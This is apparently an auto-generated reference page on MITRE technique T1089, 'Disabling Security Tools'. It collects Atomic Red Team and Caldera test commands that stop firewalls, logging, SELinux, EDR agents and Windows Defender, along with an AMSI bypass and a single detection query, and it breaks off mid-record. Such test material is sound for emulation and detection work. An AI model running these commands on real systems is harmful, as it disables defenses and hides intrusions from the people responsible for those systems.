
# Disabling Security Tools

## Description

### MITRE Description

> Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.

## Additional Attributes

* Bypass: ['File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis', 'Anti-virus']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1089

## Potential Commands

```
if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
then
  service iptables stop
  chkconfig off iptables
  service ip6tables stop
  chkconfig off ip6tables
else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
  systemctl stop firewalld
  systemctl disable firewalld
fi

if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
then
  service rsyslog stop
  chkconfig off rsyslog
else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
  systemctl stop rsyslog
  systemctl disable rsyslog
fi

if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
then
  service cbdaemon stop
  chkconfig off cbdaemon
else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
  systemctl stop cbdaemon
  systemctl disable cbdaemon
fi

setenforce 0

sudo systemctl stop falcon-sensor.service
sudo systemctl disable falcon-sensor.service

sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist

sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist

sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist

sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist
sudo launchctl unload #{userdaemon_plist}

sudo launchctl unload #{falcond_plist}
sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist

fltmc.exe unload SysmonDrv

C:\Windows\System32\inetsrv\appcmd.exe set config "Default Web Site" /section:httplogging /dontLog:true

sysmon -u

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse

net.exe stop McAfeeDLPAgentService
sc.exe config McAfeeDLPAgentService start= disabled

Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -DisableBehaviorMonitoring 1
Set-MpPreference -DisableScriptScanning 1
Set-MpPreference -DisableBlockAtFirstSeen 1

sc stop WinDefend
sc config WinDefend start=disabled
sc query WinDefend

Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1

New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel"
New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"
New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"

"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

Stop-Service -Name McAfeeDLPAgentService
Remove-Service -Name McAfeeDLPAgentService

if (Test-Path "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe") {. "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
{'windows': {'psh': {'command': 'Set-MPPreference -DisableRealtimeMonitoring 1\n', 'cleanup': 'Set-MPPreference -DisableRealtimeMonitoring 0'}}}
{'windows': {'psh': {'command': 'Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n', 'cleanup': 'Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;\n'}}}
powershell/management/disable_rdp
powershell/management/disable_rdp
```

## Commands Dataset

```
[{'command': "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "
             '"6" ];\n'
             'then\n'
             '  service iptables stop\n'
             '  chkconfig off iptables\n'
             '  service ip6tables stop\n'
             '  chkconfig off ip6tables\n'
             "else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) "
             '-eq "7" ];\n'
             '  systemctl stop firewalld\n'
             '  systemctl disable firewalld\n'
             'fi\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "
             '"6" ];\n'
             'then\n'
             '  service rsyslog stop\n'
             '  chkconfig off rsyslog\n'
             "else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) "
             '-eq "7" ];\n'
             '  systemctl stop rsyslog\n'
             '  systemctl disable rsyslog\n'
             'fi\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "
             '"6" ];\n'
             'then\n'
             '  service cbdaemon stop\n'
             '  chkconfig off cbdaemon\n'
             "else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) "
             '-eq "7" ];\n'
             '  systemctl stop cbdaemon\n'
             '  systemctl disable cbdaemon\n'
             'fi\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'setenforce 0\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'sudo systemctl stop falcon-sensor.service\n'
             'sudo systemctl disable falcon-sensor.service\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'sudo launchctl unload '
             '/Library/LaunchDaemons/com.carbonblack.daemon.plist\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'sudo launchctl unload '
             '/Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'sudo launchctl unload '
             '/Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'sudo launchctl unload '
             '/Library/LaunchDaemons/com.crowdstrike.falcond.plist\n'
             'sudo launchctl unload #{userdaemon_plist}\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'sudo launchctl unload #{falcond_plist}\n'
             'sudo launchctl unload '
             '/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'fltmc.exe unload SysmonDrv\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'C:\\Windows\\System32\\inetsrv\\appcmd.exe set config "Default '
             'Web Site" /section:httplogging /dontLog:true\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'sysmon -u\n', 'name': None, 'source': 'atomics/T1089/T1089.yaml'},
 {'command': "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'Remove-Item -Path '
             '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}" '
             '-Recurse\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'net.exe stop McAfeeDLPAgentService\n'
             'sc.exe config McAfeeDLPAgentService start= disabled\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'Set-MpPreference -DisableRealtimeMonitoring 1\n'
             'Set-MpPreference -DisableBehaviorMonitoring 1\n'
             'Set-MpPreference -DisableScriptScanning 1\n'
             'Set-MpPreference -DisableBlockAtFirstSeen 1\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'sc stop WinDefend\n'
             'sc config WinDefend start=disabled\n'
             'sc query WinDefend\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'Set-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows '
             'Defender" -Name DisableAntiSpyware -Value 1\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'New-Item -Path '
             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel"\n'
             'New-Item -Path '
             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security"\n'
             'New-Item -Path '
             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView"\n'
             'New-ItemProperty -Path '
             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security" '
             '-Name "VBAWarnings" -Value "1" -PropertyType "Dword"\n'
             'New-ItemProperty -Path '
             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
             '-Name "DisableInternetFilesInPV" -Value "1" -PropertyType '
             '"Dword"\n'
             'New-ItemProperty -Path '
             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
             '-Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType '
             '"Dword"\n'
             'New-ItemProperty -Path '
             '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
             '-Name "DisableAttachementsInPV" -Value "1" -PropertyType '
             '"Dword"\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': '"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" '
             '-RemoveDefinitions -All\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'Stop-Service -Name McAfeeDLPAgentService\n'
             'Remove-Service -Name McAfeeDLPAgentService\n',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': 'if (Test-Path "C:\\ProgramData\\Package '
             'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe") '
             '{. "C:\\ProgramData\\Package '
             'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe" '
             '/repair /uninstall /quiet } else { Get-ChildItem -Path '
             '"C:\\ProgramData\\Package Cache" -Include "WindowsSensor.exe" '
             '-Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath '
             '$_.FullName); if ($sig.Status -eq "Valid" -and '
             '$sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . '
             '"$_" /repair /uninstall /quiet; break;}}}',
  'name': None,
  'source': 'atomics/T1089/T1089.yaml'},
 {'command': {'windows': {'psh': {'cleanup': 'Set-MPPreference '
                                             '-DisableRealtimeMonitoring 0',
                                  'command': 'Set-MPPreference '
                                             '-DisableRealtimeMonitoring '
                                             '1\n'}}},
  'name': 'Disable Windows Defender Real-Time Protection',
  'source': 'data/abilities/defense-evasion/49470433-30ce-4714-a44b-bea9dbbeca9a.yml'},
 {'command': {'windows': {'psh': {'cleanup': 'Set-MpPreference '
                                             '-DisableIntrusionPreventionSystem '
                                             '$false;\n'
                                             'Set-MpPreference '
                                             '-DisableIOAVProtection $false;\n'
                                             'Set-MpPreference '
                                             '-DisableRealtimeMonitoring '
                                             '$false;\n'
                                             'Set-MpPreference '
                                             '-DisableScriptScanning $false;\n'
                                             'Set-MpPreference '
                                             '-EnableControlledFolderAccess '
                                             'Enabled;\n',
                                  'command': 'Set-MpPreference '
                                             '-DisableIntrusionPreventionSystem '
                                             '$true;\n'
                                             'Set-MpPreference '
                                             '-DisableIOAVProtection $true;\n'
                                             'Set-MpPreference '
                                             '-DisableRealtimeMonitoring '
                                             '$true;\n'
                                             'Set-MpPreference '
                                             '-DisableScriptScanning $true;\n'
                                             'Set-MpPreference '
                                             '-EnableControlledFolderAccess '
                                             'Disabled;\n'}}},
  'name': 'Disable Windows Defender All',
  'source': 'data/abilities/defense-evasion/b007f6e8-4a87-4440-8888-29ceab047d9b.yml'},
 {'command': 'powershell/management/disable_rdp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/disable_rdp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'Disabling Security Tools Service Stopped',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_path contains "net.exe"or '
           'process_path contains "sc.exe")and file_directory contains "stop"'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Disabling Security Tools': {'atomic_tests': [{'description': 'Disables '
                                                                                       'the '
                                                                                       'iptables '
                                                                                       'firewall\n',
                                                                        'executor': {'command': 'if '
                                                                                                '[ '
                                                                                                '$(rpm '
                                                                                                '-q '
                                                                                                '--queryformat '
                                                                                                "'%{VERSION}' "
                                                                                                'centos-release) '
                                                                                                '-eq '
                                                                                                '"6" '
                                                                                                '];\n'
                                                                                                'then\n'
                                                                                                '  '
                                                                                                'service '
                                                                                                'iptables '
                                                                                                'stop\n'
                                                                                                '  '
                                                                                                'chkconfig '
                                                                                                'off '
                                                                                                'iptables\n'
                                                                                                '  '
                                                                                                'service '
                                                                                                'ip6tables '
                                                                                                'stop\n'
                                                                                                '  '
                                                                                                'chkconfig '
                                                                                                'off '
                                                                                                'ip6tables\n'
                                                                                                'else '
                                                                                                'if '
                                                                                                '[ '
                                                                                                '$(rpm '
                                                                                                '-q '
                                                                                                '--queryformat '
                                                                                                "'%{VERSION}' "
                                                                                                'centos-release) '
                                                                                                '-eq '
                                                                                                '"7" '
                                                                                                '];\n'
                                                                                                '  '
                                                                                                'systemctl '
                                                                                                'stop '
                                                                                                'firewalld\n'
                                                                                                '  '
                                                                                                'systemctl '
                                                                                                'disable '
                                                                                                'firewalld\n'
                                                                                                'fi\n',
                                                                                     'name': 'sh'},
                                                                        'name': 'Disable '
                                                                                'iptables '
                                                                                'firewall',
                                                                        'supported_platforms': ['linux']},
                                                                       {'description': 'Disables '
                                                                                       'syslog '
                                                                                       'collection\n',
                                                                        'executor': {'command': 'if '
                                                                                                '[ '
                                                                                                '$(rpm '
                                                                                                '-q '
                                                                                                '--queryformat '
                                                                                                "'%{VERSION}' "
                                                                                                'centos-release) '
                                                                                                '-eq '
                                                                                                '"6" '
                                                                                                '];\n'
                                                                                                'then\n'
                                                                                                '  '
                                                                                                'service '
                                                                                                'rsyslog '
                                                                                                'stop\n'
                                                                                                '  '
                                                                                                'chkconfig '
                                                                                                'off '
                                                                                                'rsyslog\n'
                                                                                                'else '
                                                                                                'if '
                                                                                                '[ '
                                                                                                '$(rpm '
                                                                                                '-q '
                                                                                                '--queryformat '
                                                                                                "'%{VERSION}' "
                                                                                                'centos-release) '
                                                                                                '-eq '
                                                                                                '"7" '
                                                                                                '];\n'
                                                                                                '  '
                                                                                                'systemctl '
                                                                                                'stop '
                                                                                                'rsyslog\n'
                                                                                                '  '
                                                                                                'systemctl '
                                                                                                'disable '
                                                                                                'rsyslog\n'
                                                                                                'fi\n',
                                                                                     'name': 'sh'},
                                                                        'name': 'Disable '
                                                                                'syslog',
                                                                        'supported_platforms': ['linux']},
                                                                       {'description': 'Disable '
                                                                                       'the '
                                                                                       'Cb '
                                                                                       'Response '
                                                                                       'service\n',
                                                                        'executor': {'command': 'if '
                                                                                                '[ '
                                                                                                '$(rpm '
                                                                                                '-q '
                                                                                                '--queryformat '
                                                                                                "'%{VERSION}' "
                                                                                                'centos-release) '
                                                                                                '-eq '
                                                                                                '"6" '
                                                                                                '];\n'
                                                                                                'then\n'
                                                                                                '  '
                                                                                                'service '
                                                                                                'cbdaemon '
                                                                                                'stop\n'
                                                                                                '  '
                                                                                                'chkconfig '
                                                                                                'off '
                                                                                                'cbdaemon\n'
                                                                                                'else '
                                                                                                'if '
                                                                                                '[ '
                                                                                                '$(rpm '
                                                                                                '-q '
                                                                                                '--queryformat '
                                                                                                "'%{VERSION}' "
                                                                                                'centos-release) '
                                                                                                '-eq '
                                                                                                '"7" '
                                                                                                '];\n'
                                                                                                '  '
                                                                                                'systemctl '
                                                                                                'stop '
                                                                                                'cbdaemon\n'
                                                                                                '  '
                                                                                                'systemctl '
                                                                                                'disable '
                                                                                                'cbdaemon\n'
                                                                                                'fi\n',
                                                                                     'name': 'sh'},
                                                                        'name': 'Disable '
                                                                                'Cb '
                                                                                'Response',
                                                                        'supported_platforms': ['linux']},
                                                                       {'description': 'Disables '
                                                                                       'SELinux '
                                                                                       'enforcement\n',
                                                                        'executor': {'command': 'setenforce '
                                                                                                '0\n',
                                                                                     'name': 'sh'},
                                                                        'name': 'Disable '
                                                                                'SELinux',
                                                                        'supported_platforms': ['linux']},
                                                                       {'description': 'Stop '
                                                                                       'and '
                                                                                       'disable '
                                                                                       'Crowdstrike '
                                                                                       'Falcon '
                                                                                       'on '
                                                                                       'Linux\n',
                                                                        'executor': {'cleanup_command': 'sudo '
                                                                                                        'systemctl '
                                                                                                        'enable '
                                                                                                        'falcon-sensor.service\n'
                                                                                                        'sudo '
                                                                                                        'systemctl '
                                                                                                        'start '
                                                                                                        'falcon-sensor.service\n',
                                                                                     'command': 'sudo '
                                                                                                'systemctl '
                                                                                                'stop '
                                                                                                'falcon-sensor.service\n'
                                                                                                'sudo '
                                                                                                'systemctl '
                                                                                                'disable '
                                                                                                'falcon-sensor.service\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'sh'},
                                                                        'name': 'Stop '
                                                                                'Crowdstrike '
                                                                                'Falcon '
                                                                                'on '
                                                                                'Linux',
                                                                        'supported_platforms': ['linux']},
                                                                       {'description': 'Disables '
                                                                                       'Carbon '
                                                                                       'Black '
                                                                                       'Response\n',
                                                                        'executor': {'command': 'sudo '
                                                                                                'launchctl '
                                                                                                'unload '
                                                                                                '/Library/LaunchDaemons/com.carbonblack.daemon.plist\n',
                                                                                     'name': 'sh'},
                                                                        'name': 'Disable '
                                                                                'Carbon '
                                                                                'Black '
                                                                                'Response',
                                                                        'supported_platforms': ['macos']},
                                                                       {'description': 'Disables '
                                                                                       'LittleSnitch\n',
                                                                        'executor': {'command': 'sudo '
                                                                                                'launchctl '
                                                                                                'unload '
                                                                                                '/Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n',
                                                                                     'name': 'sh'},
                                                                        'name': 'Disable '
                                                                                'LittleSnitch',
                                                                        'supported_platforms': ['macos']},
                                                                       {'description': 'Disables '
                                                                                       'OpenDNS '
                                                                                       'Umbrella\n',
                                                                        'executor': {'command': 'sudo '
                                                                                                'launchctl '
                                                                                                'unload '
                                                                                                '/Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n',
                                                                                     'name': 'sh'},
                                                                        'name': 'Disable '
                                                                                'OpenDNS '
                                                                                'Umbrella',
                                                                        'supported_platforms': ['macos']},
                                                                       {'description': 'Stop '
                                                                                       'and '
                                                                                       'unload '
                                                                                       'Crowdstrike '
                                                                                       'Falcon '
                                                                                       'daemons '
                                                                                       'falcond '
                                                                                       'and '
                                                                                       'userdaemon '
                                                                                       'on '
                                                                                       'macOS\n',
                                                                        'executor': {'command': 'sudo '
                                                                                                'launchctl '
                                                                                                'unload '
                                                                                                '#{falcond_plist}\n'
                                                                                                'sudo '
                                                                                                'launchctl '
                                                                                                'unload '
                                                                                                '#{userdaemon_plist}\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'sh'},
                                                                        'input_arguments': {'falcond_plist': {'default': '/Library/LaunchDaemons/com.crowdstrike.falcond.plist',
                                                                                                              'description': 'The '
                                                                                                                             'path '
                                                                                                                             'of '
                                                                                                                             'the '
                                                                                                                             'Crowdstrike '
                                                                                                                             'Falcon '
                                                                                                                             'plist '
                                                                                                                             'file',
                                                                                                              'type': 'path'},
                                                                                            'userdaemon_plist': {'default': '/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist',
                                                                                                                 'description': 'The '
                                                                                                                                'path '
                                                                                                                                'of '
                                                                                                                                'the '
                                                                                                                                'Crowdstrike '
                                                                                                                                'Userdaemon '
                                                                                                                                'plist '
                                                                                                                                'file',
                                                                                                                 'type': 'path'}},
                                                                        'name': 'Stop '
                                                                                'and '
                                                                                'unload '
                                                                                'Crowdstrike '
                                                                                'Falcon '
                                                                                'on '
                                                                                'macOS',
                                                                        'supported_platforms': ['macos']},
                                                                       {'dependencies': [{'description': 'Sysmon '
                                                                                                         'must '
                                                                                                         'be '
                                                                                                         'downloaded\n',
                                                                                          'get_prereq_command': 'Invoke-WebRequest '
                                                                                                                '"https://download.sysinternals.com/files/Sysmon.zip" '
                                                                                                                '-OutFile '
                                                                                                                '"$env:TEMP\\Sysmon.zip"\n'
                                                                                                                'Expand-Archive '
                                                                                                                '$env:TEMP\\Sysmon.zip '
                                                                                                                '$env:TEMP\\Sysmon '
                                                                                                                '-Force\n'
                                                                                                                'Remove-Item '
                                                                                                                '$env:TEMP\\Sysmon.zip '
                                                                                                                '-Force\n',
                                                                                          'prereq_command': 'if '
                                                                                                            '((cmd.exe '
                                                                                                            '/c '
                                                                                                            '"where.exe '
                                                                                                            'Sysmon.exe '
                                                                                                            '2> '
                                                                                                            'nul '
                                                                                                            '| '
                                                                                                            'findstr '
                                                                                                            'Sysmon '
                                                                                                            '2> '
                                                                                                            'nul") '
                                                                                                            '-or '
                                                                                                            '(Test-Path '
                                                                                                            '$env:Temp\\Sysmon\\Sysmon.exe)) '
                                                                                                            '{ '
                                                                                                            'exit '
                                                                                                            '0 '
                                                                                                            '} '
                                                                                                            'else '
                                                                                                            '{ '
                                                                                                            'exit '
                                                                                                            '1 '
                                                                                                            '}\n'},
                                                                                         {'description': 'sysmon '
                                                                                                         'must '
                                                                                                         'be '
                                                                                                         'Installed\n',
                                                                                          'get_prereq_command': 'if(cmd.exe '
                                                                                                                '/c '
                                                                                                                '"where.exe '
                                                                                                                'Sysmon.exe '
                                                                                                                '2> '
                                                                                                                'nul '
                                                                                                                '| '
                                                                                                                'findstr '
                                                                                                                'Sysmon '
                                                                                                                '2> '
                                                                                                                'nul") '
                                                                                                                '{ '
                                                                                                                'C:\\Windows\\Sysmon.exe '
                                                                                                                '-accepteula '
                                                                                                                '-i '
                                                                                                                '} '
                                                                                                                'else\n'
                                                                                                                '{ '
                                                                                                                'Set-Location '
                                                                                                                '$env:TEMP\\Sysmon\\; '
                                                                                                                '.\\Sysmon.exe '
                                                                                                                '-accepteula '
                                                                                                                '-i}\n',
                                                                                          'prereq_command': 'if(sc.exe '
                                                                                                            'query '
                                                                                                            'sysmon '
                                                                                                            '| '
                                                                                                            'findstr '
                                                                                                            'sysmon) '
                                                                                                            '{ '
                                                                                                            'exit '
                                                                                                            '0 '
                                                                                                            '} '
                                                                                                            'else '
                                                                                                            '{ '
                                                                                                            'exit '
                                                                                                            '1 '
                                                                                                            '}\n'},
                                                                                         {'description': 'sysmon '
                                                                                                         'filter '
                                                                                                         'must '
                                                                                                         'be '
                                                                                                         'loaded\n',
                                                                                          'get_prereq_command': 'sysmon '
                                                                                                                '-u\n'
                                                                                                                'sysmon '
                                                                                                                '-accepteula '
                                                                                                                '-i\n',
                                                                                          'prereq_command': 'if(fltmc.exe '
                                                                                                            'filters '
                                                                                                            '| '
                                                                                                            'findstr '
                                                                                                            '#{sysmon_driver}) '
                                                                                                            '{ '
                                                                                                            'exit '
                                                                                                            '0 '
                                                                                                            '} '
                                                                                                            'else '
                                                                                                            '{ '
                                                                                                            'exit '
                                                                                                            '1 '
                                                                                                            '}\n'}],
                                                                        'dependency_executor_name': 'powershell',
                                                                        'description': 'Unloads '
                                                                                       'the '
                                                                                       'Sysinternals '
                                                                                       'Sysmon '
                                                                                       'filter '
                                                                                       'driver '
                                                                                       'without '
                                                                                       'stopping '
                                                                                       'the '
                                                                                       'Sysmon '
                                                                                       'service. '
                                                                                       'To '
                                                                                       'verify '
                                                                                       'successful '
                                                                                       'execution, '
                                                                                       'o '
                                                                                       'verify '
                                                                                       'successful '
                                                                                       'execution,\n'
                                                                                       'run '
                                                                                       'the '
                                                                                       "prereq_command's "
                                                                                       'and '
                                                                                       'it '
                                                                                       'should '
                                                                                       'fail '
                                                                                       'with '
                                                                                       'an '
                                                                                       'error '
                                                                                       'of '
                                                                                       '"sysmon '
                                                                                       'filter '
                                                                                       'must '
                                                                                       'be '
                                                                                       'loaded".\n',
                                                                        'executor': {'cleanup_command': 'sysmon '
                                                                                                        '-u '
                                                                                                        '-i '
                                                                                                        '> '
                                                                                                        'nul '
                                                                                                        '2>&1\n'
                                                                                                        'sysmon '
                                                                                                        '-i '
                                                                                                        '-accepteula '
                                                                                                        '-i '
                                                                                                        '> '
                                                                                                        'nul '
                                                                                                        '2>&1\n'
                                                                                                        '%temp%\\Sysmon\\sysmon.exe '
                                                                                                        '-u '
                                                                                                        '> '
                                                                                                        'nul '
                                                                                                        '2>&1\n'
                                                                                                        '%temp%\\Sysmon\\sysmon.exe '
                                                                                                        '-accepteula '
                                                                                                        '-i '
                                                                                                        '> '
                                                                                                        'nul '
                                                                                                        '2>&1\n',
                                                                                     'command': 'fltmc.exe '
                                                                                                'unload '
                                                                                                '#{sysmon_driver}\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'command_prompt',
                                                                                     'prereq_command': 'fltmc.exe '
                                                                                                       'filters '
                                                                                                       '| '
                                                                                                       'findstr '
                                                                                                       '#{sysmon_driver}\n'},
                                                                        'input_arguments': {'sysmon_driver': {'default': 'SysmonDrv',
                                                                                                              'description': 'The '
                                                                                                                             'name '
                                                                                                                             'of '
                                                                                                                             'the '
                                                                                                                             'Sysmon '
                                                                                                                             'filter '
                                                                                                                             'driver '
                                                                                                                             '(this '
                                                                                                                             'can '
                                                                                                                             'change '
                                                                                                                             'from '
                                                                                                                             'the '
                                                                                                                             'default)',
                                                                                                              'type': 'string'}},
                                                                        'name': 'Unload '
                                                                                'Sysmon '
                                                                                'Filter '
                                                                                'Driver',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'Disables '
                                                                                       'HTTP '
                                                                                       'logging '
                                                                                       'on '
                                                                                       'a '
                                                                                       'Windows '
                                                                                       'IIS '
                                                                                       'web '
                                                                                       'server '
                                                                                       'as '
                                                                                       'seen '
                                                                                       'by '
                                                                                       'Threat '
                                                                                       'Group '
                                                                                       '3390 '
                                                                                       '(Bronze '
                                                                                       'Union).\n'
                                                                                       'This '
                                                                                       'action '
                                                                                       'requires '
                                                                                       'HTTP '
                                                                                       'logging '
                                                                                       'configurations '
                                                                                       'in '
                                                                                       'IIS '
                                                                                       'to '
                                                                                       'be '
                                                                                       'unlocked.\n',
                                                                        'executor': {'cleanup_command': 'C:\\Windows\\System32\\inetsrv\\appcmd.exe '
                                                                                                        'set '
                                                                                                        'config '
                                                                                                        '"#{website_name}" '
                                                                                                        '/section:httplogging '
                                                                                                        '/dontLog:false\n',
                                                                                     'command': 'C:\\Windows\\System32\\inetsrv\\appcmd.exe '
                                                                                                'set '
                                                                                                'config '
                                                                                                '"#{website_name}" '
                                                                                                '/section:httplogging '
                                                                                                '/dontLog:true\n',
                                                                                     'name': 'powershell',
                                                                                     'prereq_command': 'if(Test-Path '
                                                                                                       'C:\\Windows\\System32\\inetsrv\\appcmd.exe) '
                                                                                                       '{exit '
                                                                                                       '0} '
                                                                                                       'else '
                                                                                                       '{exit '
                                                                                                       '1}\n'},
                                                                        'input_arguments': {'website_name': {'default': 'Default '
                                                                                                                        'Web '
                                                                                                                        'Site',
                                                                                                             'description': 'The '
                                                                                                                            'name '
                                                                                                                            'of '
                                                                                                                            'the '
                                                                                                                            'website '
                                                                                                                            'on '
                                                                                                                            'a '
                                                                                                                            'server',
                                                                                                             'type': 'string'}},
                                                                        'name': 'Disable '
                                                                                'Windows '
                                                                                'IIS '
                                                                                'HTTP '
                                                                                'Logging',
                                                                        'supported_platforms': ['windows']},
                                                                       {'dependencies': [{'description': 'Sysmon '
                                                                                                         'executable '
                                                                                                         'must '
                                                                                                         'be '
                                                                                                         'available\n',
                                                                                          'get_prereq_command': '$parentpath '
                                                                                                                '= '
                                                                                                                'Split-Path '
                                                                                                                '"#{sysmon_exe}"; '
                                                                                                                '$zippath '
                                                                                                                '= '
                                                                                                                '"$parentpath\\Sysmon.zip"\n'
                                                                                                                'New-Item '
                                                                                                                '-ItemType '
                                                                                                                'Directory '
                                                                                                                '$parentpath '
                                                                                                                '-Force '
                                                                                                                '| '
